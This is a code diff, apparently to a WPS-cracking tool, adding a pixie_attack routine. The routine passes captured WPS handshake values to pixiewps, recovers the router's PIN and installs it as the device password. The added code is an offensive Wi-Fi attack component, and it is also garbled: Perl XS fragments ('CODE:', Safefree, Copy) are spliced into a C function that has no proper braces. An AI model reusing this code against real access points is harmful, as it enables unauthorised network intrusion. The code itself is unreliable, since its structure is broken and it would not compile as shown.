@@ -39,6 +39,12 @@
 #define	EAP_SUCCESS  3
 #define	EAP_FAILURE  4
 
+#define PIXIE_FREE(KEY) \
+	do { \
+		if(pixie.KEY) free(pixie.KEY); \
+		pixie.KEY = 0; \
+	} while(0)
+
 #include "Ctxs.h"
 
 
@@ -538,7 +544,44 @@ pixie_format(key, length, outbuf)
 
 void
 pixie_attack()
-
+CODE:
+	WPS_DATA *wps = get_wps();
+	struct pixie *p = &pixie;
+	int dh_small = get_dh_small();
+	if(p->do_pixie) {
+		char uptime_str[64];
+		snprintf(uptime_str, sizeof(uptime_str), "-u %llu ", (unsigned long long) globule->uptime);
+		snprintf(ptd.cmd, sizeof (ptd.cmd), "pixiewps %s-e %s -s %s -z %s -a %s -n %s %s %s", (p->use_uptime ? uptime_str : ""), p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce, dh_small ? "-S" : "-r" , dh_small ? "" : p->pkr);
+		printf("executing %s\n", ptd.cmd);
+		ptd.pinlen = 64;
+		ptd.pinbuf[0] = 0;
+		if(pixie_run_thread(&ptd)) {
+			cprintf(INFO, "[+] Pixiewps: success: setting pin to %s\n", ptd.pinbuf);
+			set_pin(ptd.pinbuf);
+			if(timeout_hit) {
+				cprintf(VERBOSE, "[+] Pixiewps timeout hit, sent WSC NACK\n");
+				cprintf(INFO, "[+] Pixiewps timeout, exiting. Send pin with -p\n");
+				update_wpc_from_pin();
+				exit(0);
+			}
+			Safefree(wps->dev_password);
+			wps->dev_password = malloc(ptd.pinlen+1);
+			//memcpy(wps->dev_password, ptd.pinbuf, ptd.pinlen+1);
+			int pinlength = ptd.pinlen+1;
+			Copy(ptd.pinbuf, wps->dev_password, pinlength, 1);
+			wps->dev_password_len = ptd.pinlen;
+		} else {
+			cprintf(INFO, "[-] Pixiewps fail, sending WPS NACK\n");
+			send_wsc_nack();
+			exit(1);
+		}
+	}
+	PIXIE_FREE(authkey);
+	PIXIE_FREE(pkr);
+	PIXIE_FREE(pke);
+	PIXIE_FREE(enonce);
+	PIXIE_FREE(ehash1);
+	PIXIE_FREE(ehash2);
 
 char * 
 build_wps_pin()
